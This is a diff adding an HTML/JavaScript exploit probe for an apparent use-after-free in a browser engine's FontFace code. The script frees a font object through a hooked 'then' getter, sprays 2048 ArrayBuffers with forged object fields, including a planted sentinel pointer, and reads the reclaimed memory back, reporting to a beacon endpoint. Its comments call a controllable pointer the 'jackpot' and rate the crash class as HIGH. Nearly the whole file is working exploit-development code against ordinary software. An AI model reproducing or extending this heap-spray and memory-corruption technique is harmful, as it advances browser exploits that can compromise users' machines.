@@ -1,0 +1,99 @@
+<!--
+  p582: Pre-set m_table sentinel test.
+  Same vincenzoiacovone recipe but with +0x58 = sentinel (non-null).
+  Tests whether the engine uses our pre-set m_table, overwrites it,
+  or skips the hash table entirely (status=3 prevents addClient?).
+
+  Three possible outcomes:
+    A) Engine overwrites sentinel with real T → always allocates fresh.
+       Beacons: AH<i>,rc=3, +0x58 = heap_addr (not sentinel)
+    B) Engine uses sentinel → crash (dereferences unmapped addr).
+       Beacons: G, F, S2048, then silence (process died)
+    C) Engine skips hash table entirely (status=3 blocks addClient)
+       → sentinel retained, process alive.
+       Beacons: AH<i>,rc=3, +0x58 = sentinel
+
+  Outcome C = jackpot: we can pre-set +0x58 to any address and the
+  engine won't touch it until we change status and trigger the walk.
+
+  Safety: rc=2, +0x60=0, +0x64=0xFFFFFFFF, +0x82=3
+  Sentinel: 0x4142434445464748 (ASCII "ABCDEFGH", recognizable in dumps)
+
+  Expected beacons:
+    G         = start
+    F         = font freed
+    S<n>      = spray done
+    <t>H<i>,rc=<d>  = hit at buffer i
+    <t>D0/D1/D2     = qword dumps
+    <t>MISS         = no hit
+    ALIVE / ALIVE2  = survival markers
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p</title>
+<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+function wQ(v,o,hi,lo){wD(v,o,lo);wD(v,o+4,hi);}
+
+var SENT_HI=0x41424344;
+var SENT_LO=0x45464748;
+
+function main(){
+b('G');
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+var fired=0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){if(fired)return;fired=1;
+document.getElementById('v').remove();
+try{document.fonts.delete(this);}catch(e){}
+document.body.offsetHeight;
+b('F');
+var lane=[];
+for(var i=0;i<2048;i++)lane.push(new Uint8Array(new ArrayBuffer(192)));
+for(var j=0;j<lane.length;j++){
+  wD(lane[j],0x00,2);        // rc=2
+  wQ(lane[j],0x58,SENT_HI,SENT_LO); // m_table = sentinel
+  wD(lane[j],0x60,0);        // opCount/keyCount=0
+  wD(lane[j],0x64,0xFFFFFFFF); // maxOp/tableSizeMask=max
+  lane[j][0x82]=3;            // Status::Success
+}
+b('S'+lane.length);
+window._l=lane;
+return;},set:function(){}});
+
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+function scan(tag){
+  var lane=window._l;if(!lane)return;
+  var hi=window._hi;
+  if(hi===undefined){
+    for(var i=0;i<lane.length;i++){
+      var v=lane[i],rc=rD(v,0);
+      if(rc!==2){window._hi=i;hi=i;break;}
+      var s58hi=rD(v,0x5C),s58lo=rD(v,0x58);
+      if(s58hi!==SENT_HI||s58lo!==SENT_LO){window._hi=i;hi=i;break;}
+    }
+  }
+  if(hi===undefined){b(tag+'MISS');return;}
+  var v=lane[hi];
+  var rc=rD(v,0),p58=rQ(v,0x58);
+  var isSent=(rD(v,0x5C)===SENT_HI&&rD(v,0x58)===SENT_LO);
+  b(tag+'H'+hi+',rc='+rc+',sent='+(isSent?'YES':'NO'));
+  var d='';for(var q=0;q<8;q++)d+=rQ(v,q*8)+'.';b(tag+'D0:'+d);
+  d='';for(var q=8;q<16;q++)d+=rQ(v,q*8)+'.';b(tag+'D1:'+d);
+  d='';for(var q=16;q<24;q++)d+=rQ(v,q*8)+'.';b(tag+'D2:'+d);
+}
+
+setTimeout(function(){scan('A');},60);
+setTimeout(function(){scan('B');},400);
+setTimeout(function(){scan('C');},1000);
+setTimeout(function(){b('ALIVE');},500);
+setTimeout(function(){b('ALIVE2');},2000);
+}
+setTimeout(main,0);
+</script></head><body>p</body></html>
